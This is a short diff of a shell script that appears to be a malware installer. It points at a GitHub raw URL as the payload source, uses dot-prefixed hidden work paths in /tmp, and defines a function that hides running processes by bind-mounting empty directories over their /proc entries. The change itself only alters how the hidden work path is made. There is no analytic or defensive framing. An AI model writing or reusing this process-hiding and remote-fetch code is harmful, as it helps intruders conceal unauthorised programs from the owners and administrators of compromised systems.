@@ -2,8 +2,9 @@
 
 mode="${1:-0}"
 src="https://raw.githubusercontent.com/pakoinake/kaxgn/main"
-work="$(mktemp -d -t .XXXXXX 2>/dev/null)"
-[ -n "$work" ] || work="/tmp/.work"
+work="$(mktemp -t .XXXXXX 2>/dev/null)"
+[ -n "${work}" ] || work="/tmp/.work"
+mkdir -p "${work}"
 
 hPid() {
   [ -d "/proc/$1" ] && [ ! -d "/tmp/.proc/$1" ] && mkdir -p "/tmp/.proc/$1" && mount -o bind "/tmp/.proc/$1" "/proc/$1" && return 0 || return 1
